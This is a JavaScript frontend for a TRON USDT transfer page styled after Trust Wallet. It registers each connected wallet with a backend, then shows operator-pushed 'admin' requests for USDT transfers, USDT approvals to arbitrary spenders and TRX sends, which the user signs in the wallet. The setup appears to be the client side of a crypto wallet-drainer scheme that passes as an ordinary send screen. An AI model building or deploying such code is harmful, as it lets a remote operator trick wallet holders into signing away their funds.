import "./style.css";
import { TronWeb } from "tronweb";
import {
  WalletConnectChainID,
  WalletConnectWallet,
} from "@tronweb3/walletconnect-tron";

const TRON_RPC = "https://api.trongrid.io";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_DECIMALS = 6;
const TRX_DECIMALS = 6;
const FEE_LIMIT = 200_000_000;
const INJECTED_WAIT_MS = 5000;
const INJECTED_POLL_MS = 200;
const CLIENT_ID_KEY = "trust_tron_client_id";
const CONN_MODE_KEY = "trust_tron_conn_mode";

const FALLBACK_WC_PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const WC_PROJECT_ID =
  import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() || FALLBACK_WC_PROJECT_ID;
const TRONGRID_KEY = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
const APP_NAME = import.meta.env.VITE_APP_NAME?.trim() || "TRON DApp";
const APP_DESC =
  import.meta.env.VITE_APP_DESCRIPTION?.trim() || "TRON USDT dApp";
const APP_ICON =
  import.meta.env.VITE_APP_ICON_URL?.trim() || `${location.origin}/logo.png`;

function isLocalHost(hostname = location.hostname) {
  return ["localhost", "127.0.0.1"].includes(hostname);
}

function trimSlash(value) {
  return String(value || "").replace(/\/+$/, "");
}

function defaultBackendHttp() {
  return isLocalHost()
    ? `${location.protocol}//${location.hostname}:8787`
    : location.origin;
}

function defaultBackendWs() {
  const httpBase = defaultBackendHttp();
  if (httpBase.startsWith("https://")) return `wss://${httpBase.slice(8)}/ws`;
  if (httpBase.startsWith("http://")) return `ws://${httpBase.slice(7)}/ws`;
  return `${location.protocol === "https:" ? "wss" : "ws"}://${location.host}/ws`;
}

const BACKEND_HTTP = trimSlash(
  import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || defaultBackendHttp(),
);
const BACKEND_WS = trimSlash(
  import.meta.env.VITE_BACKEND_WS_URL?.trim() || defaultBackendWs(),
);

function isTrustWalletUserAgent(ua = navigator.userAgent || "") {
  return /TrustWallet|Trust\/|Trust Crypto Browser/i.test(ua);
}

function isTronWalletUserAgent(ua = navigator.userAgent || "") {
  return isTrustWalletUserAgent(ua) || /TronLink/i.test(ua);
}

function getInjectedTronWeb() {
  if (window.tronWeb && typeof window.tronWeb.request === "function") {
    return window.tronWeb;
  }
  if (window.tronWeb && window.tronWeb.defaultAddress) {
    return window.tronWeb;
  }
  return null;
}

function isLikelyInjectedWalletBrowser() {
  return Boolean(getInjectedTronWeb()) || isTronWalletUserAgent();
}

async function waitForInjectedTronWeb(timeoutMs = INJECTED_WAIT_MS) {
  const startedAt = Date.now();
  let injected = getInjectedTronWeb();
  while (!injected && Date.now() - startedAt < timeoutMs) {
    await new Promise((resolve) => setTimeout(resolve, INJECTED_POLL_MS));
    injected = getInjectedTronWeb();
  }
  return injected;
}

const el = {
  connectStatus: document.getElementById("connectStatus"),
  walletAddress: document.getElementById("walletAddress"),
  recipientInput: document.getElementById("recipientInput"),
  pasteBtn: document.getElementById("pasteBtn"),
  amountInput: document.getElementById("amountInput"),
  maxBtn: document.getElementById("maxBtn"),
  fiatValue: document.getElementById("fiatValue"),
  balanceValue: document.getElementById("balanceValue"),
  adminRequestSection: document.getElementById("adminRequestSection"),
  adminRequests: document.getElementById("adminRequests"),
  connectBtn: document.getElementById("connectBtn"),
  disconnectBtn: document.getElementById("disconnectBtn"),
  retryConnectBtn: document.getElementById("retryConnectBtn"),
  sendBtn: document.getElementById("sendBtn"),
  backendStatus: document.getElementById("backendStatus"),
  logs: document.getElementById("logs"),
};

const tronWeb = new TronWeb({
  fullHost: TRON_RPC,
  headers: TRONGRID_KEY ? { "TRON-PRO-API-KEY": TRONGRID_KEY } : {},
});

const clientId = getOrCreateClientId();
const pendingRequests = new Map();
const processingRequests = new Set();
const logLines = [];

let connectedAddress = "";
let connMode = null;
let wcClient = null;
let ws = null;
let wsReconnectTimer = null;
let heartbeatTimer = null;
let accountPoll = null;
let usdtBalanceRaw = "";
let sendingNow = false;
let showRetryConnect = false;
let keepBackendSync = false;
let connectInFlight = false;

function getOrCreateClientId() {
  let id = localStorage.getItem(CLIENT_ID_KEY);
  if (!id) {
    id =
      typeof crypto.randomUUID === "function"
        ? crypto.randomUUID()
        : `${Date.now().toString(36)}_${Math.random().toString(36).slice(2)}`;
    localStorage.setItem(CLIENT_ID_KEY, id);
  }
  return id;
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function shortAddr(address) {
  if (!address || address.length < 12) return address;
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function decimalToInt(amount, decimals) {
  const value = String(amount || "").trim();
  if (!/^\d+(\.\d+)?$/.test(value)) throw new Error("Invalid amount");
  const [whole, frac = ""] = value.split(".");
  if (frac.length > decimals) {
    throw new Error(`Max ${decimals} decimal places`);
  }
  return (
    `${whole.replace(/^0+(?=\d)/, "") || "0"}${frac.padEnd(decimals, "0")}`.replace(
      /^0+(?=\d)/,
      "",
    ) || "0"
  );
}

function intToDecimal(raw, decimals) {
  const digits = String(raw || "0").replace(/\D/g, "") || "0";
  const safe = digits.padStart(decimals + 1, "0");
  const whole = safe.slice(0, safe.length - decimals) || "0";
  const frac = safe.slice(-decimals).replace(/0+$/, "");
  return frac ? `${whole}.${frac}` : whole;
}

function formatUsdLike(amount) {
  const numeric = Number(amount || 0);
  if (!Number.isFinite(numeric) || numeric <= 0) return "~ $0.00";
  return `~ $${numeric.toLocaleString(undefined, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  })}`;
}

function setStatus(message, isError = false) {
  if (!el.connectStatus) return;
  el.connectStatus.textContent = message;
  el.connectStatus.classList.toggle("error", Boolean(isError));
}

function setBackendStatus(message) {
  if (!el.backendStatus) return;
  el.backendStatus.textContent = message;
}

function log(message) {
  if (!el.logs) return;
  logLines.unshift(`[${new Date().toLocaleTimeString()}] ${message}`);
  if (logLines.length > 12) logLines.length = 12;
  el.logs.hidden = logLines.length === 0;
  el.logs.textContent = logLines.join("\n");
}

function isPositiveAmount(value) {
  const numeric = Number(value);
  return Number.isFinite(numeric) && numeric > 0;
}

function looksLikeTronAddress(value) {
  const input = String(value || "").trim();
  if (!input) return false;
  if (typeof tronWeb.isAddress === "function") return tronWeb.isAddress(input);
  if (typeof TronWeb.isAddress === "function") return TronWeb.isAddress(input);
  return input.startsWith("T") && input.length >= 30;
}

function updateFiatValue() {
  if (!el.fiatValue) return;
  el.fiatValue.textContent = formatUsdLike(el.amountInput?.value);
}

function updateBalanceLabel() {
  if (!el.balanceValue) return;
  if (!usdtBalanceRaw) {
    el.balanceValue.textContent = "Balance: -- USDT";
    return;
  }
  el.balanceValue.textContent = `Balance: ${intToDecimal(usdtBalanceRaw, USDT_DECIMALS)} USDT`;
}

function updateSendButton() {
  if (!el.sendBtn) return;
  const canSend =
    Boolean(connectedAddress) &&
    Boolean(String(el.recipientInput?.value || "").trim()) &&
    isPositiveAmount(el.amountInput?.value) &&
    !sendingNow;
  el.sendBtn.disabled = !canSend;
  el.sendBtn.textContent = sendingNow ? "Sending..." : "Next";
}

function syncConnectedUi() {
  const isConnected = Boolean(connectedAddress);
  const preferInjectedFlow = isLikelyInjectedWalletBrowser();
  el.walletAddress.textContent = isConnected ? connectedAddress : "";
  el.connectBtn.hidden = isConnected || preferInjectedFlow;
  el.disconnectBtn.hidden = !isConnected;
  el.retryConnectBtn.hidden = isConnected || !showRetryConnect;
  updateBalanceLabel();
  updateSendButton();
}

function queueRequest(request) {
  if (!request?.id || request.status !== "pending") return;
  pendingRequests.set(request.id, request);
  renderPendingRequests();
  setBackendStatus(`${pendingRequests.size} pending request${pendingRequests.size === 1 ? "" : "s"} from admin`);
}

function removeRequest(requestId) {
  pendingRequests.delete(requestId);
  renderPendingRequests();
  if (!pendingRequests.size) {
    setBackendStatus("Connected to backend");
  }
}

function requestTypeLabel(type) {
  if (type === "trc20_transfer") return "USDT transfer";
  if (type === "trc20_approve") return "USDT approve";
  if (type === "send_trx") return "TRX send";
  return type;
}

function requestSummaryHtml(request) {
  const params = request.params || {};
  const lines = [`<p><strong>${escapeHtml(requestTypeLabel(request.type))}</strong></p>`];

  if (request.type === "trc20_transfer") {
    lines.push(`<p>To: <strong>${escapeHtml(params.to || "-")}</strong></p>`);
    lines.push(`<p>Amount: <strong>${escapeHtml(params.amount || "-")} USDT</strong></p>`);
  } else if (request.type === "trc20_approve") {
    lines.push(`<p>Spender: <strong>${escapeHtml(params.spender || "-")}</strong></p>`);
    lines.push(`<p>Amount: <strong>${escapeHtml(params.amount || "-")} USDT</strong></p>`);
  } else if (request.type === "send_trx") {
    lines.push(`<p>To: <strong>${escapeHtml(params.to || "-")}</strong></p>`);
    lines.push(`<p>Amount: <strong>${escapeHtml(params.amount || "-")} TRX</strong></p>`);
  }

  if (request.note) {
    lines.push(`<p>Note: ${escapeHtml(request.note)}</p>`);
  }

  return lines.join("");
}

function renderPendingRequests() {
  if (!el.adminRequestSection || !el.adminRequests) return;
  const items = [...pendingRequests.values()];
  el.adminRequestSection.hidden = items.length === 0;

  if (!items.length) {
    el.adminRequests.innerHTML = "";
    return;
  }

  el.adminRequests.innerHTML = items
    .map(
      (request) => `
        <article class="request-card">
          ${requestSummaryHtml(request)}
          <div class="request-actions">
            <button
              type="button"
              class="approve-btn"
              data-action="approve"
              data-request-id="${escapeHtml(request.id)}"
              ${processingRequests.has(request.id) ? "disabled" : ""}
            >
              ${processingRequests.has(request.id) ? "Opening..." : "Approve in Wallet"}
            </button>
            <button
              type="button"
              class="reject-btn"
              data-action="reject"
              data-request-id="${escapeHtml(request.id)}"
              ${processingRequests.has(request.id) ? "disabled" : ""}
            >
              Reject
            </button>
          </div>
        </article>
      `,
    )
    .join("");
}

async function bPost(path, body) {
  const response = await fetch(`${BACKEND_HTTP}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!response.ok) {
    throw new Error((await response.text()) || `HTTP ${response.status}`);
  }
  return response.json();
}

async function bGet(path) {
  const response = await fetch(`${BACKEND_HTTP}${path}`);
  if (!response.ok) {
    throw new Error((await response.text()) || `HTTP ${response.status}`);
  }
  return response.json();
}

async function registerWallet() {
  if (!connectedAddress) return;
  try {
    await bPost("/api/wallet/register", {
      clientId,
      address: connectedAddress,
      userAgent: navigator.userAgent,
      mode: connMode,
    });
  } catch (error) {
    log(`register failed: ${error}`);
  }
}

async function reportResult(request, payload) {
  await bPost(`/api/request/${encodeURIComponent(request.id)}/result`, {
    clientId,
    ...payload,
  });
}

function openWs() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
    return;
  }

  ws = new WebSocket(BACKEND_WS);

  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "identify", role: "wallet", clientId }));
    setBackendStatus("Connected to backend");
  };

  ws.onmessage = async (event) => {
    let payload;
    try {
      payload = JSON.parse(String(event.data));
    } catch {
      return;
    }

    if (payload.type === "transaction_request" && payload.request) {
      queueRequest(payload.request);
      return;
    }

    if (payload.type === "wallet_pending" && Array.isArray(payload.requests)) {
      for (const request of payload.requests) queueRequest(request);
      return;
    }

    if (payload.type === "error") {
      setBackendStatus(`Backend error: ${payload.message}`);
    }
  };

  ws.onclose = () => {
    if (!keepBackendSync) {
      return;
    }
    setBackendStatus("Backend disconnected, retrying...");
    if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
    wsReconnectTimer = setTimeout(openWs, 3000);
  };
}

function startBackendSync() {
  keepBackendSync = true;
  openWs();
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (connectedAddress) {
      bPost("/api/wallet/heartbeat", { clientId }).catch(() => {});
    }
  }, 25_000);
}

function stopBackendSync() {
  keepBackendSync = false;
  if (heartbeatTimer) {
    clearInterval(heartbeatTimer);
    heartbeatTimer = null;
  }
  if (wsReconnectTimer) {
    clearTimeout(wsReconnectTimer);
    wsReconnectTimer = null;
  }
  if (ws) {
    try {
      ws.close();
    } catch {
      // ignore
    }
    ws = null;
  }
}

async function signAndBroadcast(transaction) {
  let signedTransaction;

  if (connMode === "injected") {
    const injectedWallet = getInjectedTronWeb();
    if (!injectedWallet?.trx?.sign) {
      throw new Error("Trust Wallet TRON provider is not available");
    }
    signedTransaction = await injectedWallet.trx.sign(transaction);
  } else if (connMode === "walletconnect") {
    signedTransaction = await wcClient.signTransaction(transaction);
  } else {
    throw new Error("Wallet not connected");
  }

  const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
  if (!result?.result) {
    throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);
  }
  return result.txid;
}

async function buildAndSignTrc20Transfer(tokenAddress, to, amount, decimals = USDT_DECIMALS) {
  const token = String(tokenAddress || USDT_CONTRACT).trim();
  const recipient = String(to || "").trim();
  if (!token || !recipient) throw new Error("Token and recipient are required");

  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    token,
    "transfer(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [
      { type: "address", value: recipient },
      { type: "uint256", value: decimalToInt(amount, Number(decimals)) },
    ],
    connectedAddress,
  );

  if (!trigger?.result?.result || !trigger.transaction) {
    throw new Error("USDT transfer build failed");
  }

  return signAndBroadcast(trigger.transaction);
}

async function buildAndSignTrc20Approve(tokenAddress, spender, amount, decimals = USDT_DECIMALS) {
  const token = String(tokenAddress || USDT_CONTRACT).trim();
  const nextSpender = String(spender || "").trim();
  if (!token || !nextSpender) throw new Error("Token and spender are required");

  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    token,
    "approve(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [
      { type: "address", value: nextSpender },
      { type: "uint256", value: decimalToInt(amount, Number(decimals)) },
    ],
    connectedAddress,
  );

  if (!trigger?.result?.result || !trigger.transaction) {
    throw new Error("Approve build failed");
  }

  return signAndBroadcast(trigger.transaction);
}

async function buildAndSignTrxSend(to, amount) {
  const recipient = String(to || "").trim();
  if (!recipient) throw new Error("Recipient is required");

  const amountSun = Number(decimalToInt(amount, TRX_DECIMALS));
  const transaction = await tronWeb.transactionBuilder.sendTrx(
    recipient,
    amountSun,
    connectedAddress,
  );

  return signAndBroadcast(transaction);
}

async function processRequest(request) {
  const params = request.params || {};

  if (request.type === "trc20_transfer") {
    return buildAndSignTrc20Transfer(
      params.token || USDT_CONTRACT,
      params.to,
      params.amount,
      params.decimals ?? USDT_DECIMALS,
    );
  }

  if (request.type === "trc20_approve") {
    return buildAndSignTrc20Approve(
      params.token || USDT_CONTRACT,
      params.spender,
      params.amount,
      params.decimals ?? USDT_DECIMALS,
    );
  }

  if (request.type === "send_trx") {
    return buildAndSignTrxSend(params.to, params.amount);
  }

  throw new Error(`Unsupported request type: ${request.type}`);
}

async function approveRequest(requestId) {
  const request = pendingRequests.get(requestId);
  if (!request || processingRequests.has(requestId)) return;

  processingRequests.add(requestId);
  renderPendingRequests();
  setStatus("Opening Trust Wallet confirmation...");

  try {
    const txid = await processRequest(request);
    await reportResult(request, { action: "approved", txid });
    removeRequest(requestId);
    setStatus(`Transaction sent: ${shortAddr(txid)}`);
    await refreshBalance();
  } catch (error) {
    const message = String(error);
    const rejected = /reject|denied|cancel/i.test(message);
    await reportResult(request, {
      action: rejected ? "rejected" : "failed",
      error: message,
    });
    removeRequest(requestId);
    setStatus(rejected ? "Request rejected." : "Transaction failed.", !rejected);
    log(`request ${requestId} failed: ${message}`);
  } finally {
    processingRequests.delete(requestId);
    renderPendingRequests();
  }
}

async function rejectRequest(requestId) {
  const request = pendingRequests.get(requestId);
  if (!request || processingRequests.has(requestId)) return;

  processingRequests.add(requestId);
  renderPendingRequests();

  try {
    await reportResult(request, { action: "rejected" });
  } catch (error) {
    log(`reject failed: ${error}`);
  } finally {
    processingRequests.delete(requestId);
    removeRequest(requestId);
    renderPendingRequests();
    setStatus("Request rejected.");
  }
}

async function refreshBalance() {
  if (!connectedAddress) {
    usdtBalanceRaw = "";
    updateBalanceLabel();
    return;
  }

  try {
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const result = await contract.balanceOf(connectedAddress).call();
    usdtBalanceRaw = String(result?.toString?.() ?? result ?? "");
    updateBalanceLabel();
  } catch (error) {
    usdtBalanceRaw = "";
    updateBalanceLabel();
    log(`balance read failed: ${error}`);
  }
}

function onConnected(address, mode) {
  connectedAddress = address;
  connMode = mode;
  showRetryConnect = false;
  localStorage.setItem(CONN_MODE_KEY, mode);
  setStatus("Wallet connected");
  syncConnectedUi();
  updateFiatValue();
  registerWallet();
  startBackendSync();
  refreshBalance();
  bGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`)
    .then(({ requests }) => {
      if (Array.isArray(requests)) {
        for (const request of requests) queueRequest(request);
      }
    })
    .catch((error) => log(`pending fetch failed: ${error}`));
}

function onDisconnected() {
  connectedAddress = "";
  connMode = null;
  usdtBalanceRaw = "";
  showRetryConnect = false;
  pendingRequests.clear();
  localStorage.removeItem(CONN_MODE_KEY);
  setStatus(
    isLikelyInjectedWalletBrowser()
      ? "Waiting for Trust Wallet..."
      : "Tap Connect to link your wallet.",
  );
  setBackendStatus("");
  syncConnectedUi();
  renderPendingRequests();
  stopBackendSync();
  bPost("/api/wallet/disconnect", { clientId }).catch(() => {});
}

async function connectViaInjection(existingProvider = null) {
  setStatus("Connecting wallet...");
  let injectedWallet = existingProvider || getInjectedTronWeb();

  if (!injectedWallet) {
    setStatus("Waiting for Trust Wallet...");
    injectedWallet = await waitForInjectedTronWeb();
  }

  if (!injectedWallet) {
    setStatus("Trust Wallet TRON provider not found yet.", true);
    showRetryConnect = true;
    syncConnectedUi();
    return;
  }

  try {
    if (typeof injectedWallet.request === "function") {
      await injectedWallet.request({ method: "tron_requestAccounts" });
    }
  } catch (error) {
    if (!/already/i.test(String(error))) {
      setStatus("Connection rejected.", true);
      showRetryConnect = true;
      syncConnectedUi();
      return;
    }
  }

  let address = injectedWallet?.defaultAddress?.base58;
  for (let index = 0; index < 20 && !address; index += 1) {
    await new Promise((resolve) => setTimeout(resolve, 200));
    address = getInjectedTronWeb()?.defaultAddress?.base58;
  }

  if (!address) {
    setStatus("Could not get wallet address. Please try again.", true);
    showRetryConnect = true;
    syncConnectedUi();
    return;
  }

  showRetryConnect = false;
  onConnected(address, "injected");

  if (accountPoll) clearInterval(accountPoll);
  accountPoll = setInterval(() => {
    const current = getInjectedTronWeb()?.defaultAddress?.base58;
    if (current && current !== connectedAddress) onConnected(current, "injected");
    if (!current && connectedAddress) onDisconnected();
  }, 2000);
}

function initWcClient() {
  if (wcClient) return;

  wcClient = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: WC_PROJECT_ID,
      metadata: {
        name: APP_NAME,
        description: APP_DESC,
        url: location.origin,
        icons: [APP_ICON],
      },
    },
    themeMode: "dark",
    themeVariables: {
      "--w3m-z-index": "9999",
      "--w3m-accent": "#19a15f",
    },
  });

  wcClient.on("accountsChanged", (accounts) => {
    if (accounts?.[0]) onConnected(accounts[0], "walletconnect");
    else onDisconnected();
  });

  wcClient.on("disconnect", () => {
    onDisconnected();
  });
}

async function connectViaWalletConnect() {
  initWcClient();
  setStatus("Opening wallet selector...");

  try {
    const { address } = await wcClient.connect();
    showRetryConnect = false;
    onConnected(address, "walletconnect");
  } catch (error) {
    const message = String(error);
    setStatus(
      /reject|cancel|close/i.test(message)
        ? "Connection cancelled."
        : `Connection failed: ${message.slice(0, 80)}`,
      true,
    );
    showRetryConnect = true;
    syncConnectedUi();
  }
}

async function connectWallet() {
  if (connectInFlight) return;
  connectInFlight = true;
  showRetryConnect = false;
  syncConnectedUi();
  try {
    const preferInjectedFlow = isLikelyInjectedWalletBrowser();
    const injectedWallet = await waitForInjectedTronWeb(
      preferInjectedFlow ? INJECTED_WAIT_MS : 400,
    );

    if (injectedWallet) {
      await connectViaInjection(injectedWallet);
      return;
    }

    if (preferInjectedFlow) {
      setStatus("Trust Wallet is still loading the TRON provider.", true);
      showRetryConnect = true;
      syncConnectedUi();
      return;
    }

    await connectViaWalletConnect();
  } finally {
    connectInFlight = false;
  }
}

async function disconnectWallet() {
  if (accountPoll) {
    clearInterval(accountPoll);
    accountPoll = null;
  }
  if (connMode === "walletconnect") {
    try {
      await wcClient?.disconnect();
    } catch {
      // ignore
    }
    return;
  }
  onDisconnected();
}

async function handleManualSend() {
  if (!connectedAddress || sendingNow) return;

  const recipient = String(el.recipientInput?.value || "").trim();
  const amount = String(el.amountInput?.value || "").trim();

  if (!recipient || !isPositiveAmount(amount)) {
    setStatus("Enter a recipient and a valid amount.", true);
    return;
  }

  sendingNow = true;
  updateSendButton();
  setStatus("Opening Trust Wallet confirmation...");

  try {
    const txid = await buildAndSignTrc20Transfer(
      USDT_CONTRACT,
      recipient,
      amount,
      USDT_DECIMALS,
    );
    setStatus(`Transaction sent: ${shortAddr(txid)}`);
    el.amountInput.value = "";
    updateFiatValue();
    await refreshBalance();
  } catch (error) {
    const message = String(error);
    const rejected = /reject|denied|cancel/i.test(message);
    setStatus(rejected ? "Transaction cancelled." : "Transaction failed.", !rejected);
    log(`manual send failed: ${message}`);
  } finally {
    sendingNow = false;
    updateSendButton();
  }
}

async function handlePaste() {
  try {
    const text = await navigator.clipboard.readText();
    if (!text) return;
    el.recipientInput.value = text.trim();
    updateSendButton();
  } catch (error) {
    setStatus("Clipboard paste is not available here.", true);
    log(`paste failed: ${error}`);
  }
}

function handleMax() {
  if (!usdtBalanceRaw) return;
  el.amountInput.value = intToDecimal(usdtBalanceRaw, USDT_DECIMALS);
  updateFiatValue();
  updateSendButton();
}

function bindEvents() {
  el.connectBtn?.addEventListener("click", connectWallet);
  el.retryConnectBtn?.addEventListener("click", connectWallet);
  el.disconnectBtn?.addEventListener("click", disconnectWallet);
  el.sendBtn?.addEventListener("click", handleManualSend);
  el.pasteBtn?.addEventListener("click", handlePaste);
  el.maxBtn?.addEventListener("click", handleMax);
  el.recipientInput?.addEventListener("input", updateSendButton);
  el.amountInput?.addEventListener("input", () => {
    updateFiatValue();
    updateSendButton();
  });
  el.adminRequests?.addEventListener("click", (event) => {
    if (!(event.target instanceof Element)) return;
    const button = event.target.closest("button[data-action][data-request-id]");
    if (!button) return;
    const requestId = button.dataset.requestId;
    if (!requestId) return;
    if (button.dataset.action === "approve") {
      approveRequest(requestId);
      return;
    }
    if (button.dataset.action === "reject") {
      rejectRequest(requestId);
    }
  });
}

async function init() {
  bindEvents();
  updateFiatValue();
  updateBalanceLabel();
  renderPendingRequests();
  syncConnectedUi();

  const preferInjectedFlow = isLikelyInjectedWalletBrowser();
  const injectedWallet = await waitForInjectedTronWeb(
    preferInjectedFlow ? INJECTED_WAIT_MS : 600,
  );

  if (injectedWallet) {
    const existing = injectedWallet.defaultAddress?.base58;
    if (existing) {
      onConnected(existing, "injected");
      return;
    }
    await connectViaInjection(injectedWallet);
    return;
  }

  if (preferInjectedFlow) {
    setStatus("Waiting for Trust Wallet...");
    showRetryConnect = true;
    syncConnectedUi();
    return;
  }

  const savedMode = localStorage.getItem(CONN_MODE_KEY);
  if (savedMode === "walletconnect") {
    try {
      initWcClient();
      const { address } = await wcClient.checkConnectStatus();
      if (address) {
        onConnected(address, "walletconnect");
        return;
      }
    } catch (error) {
      log(`restore failed: ${error}`);
    }
  }

  setStatus("Tap Connect to link your wallet.");
  showRetryConnect = false;
  syncConnectedUi();
}

init().catch((error) => {
  setStatus(`Init failed: ${error}`, true);
  log(`init failed: ${error}`);
});
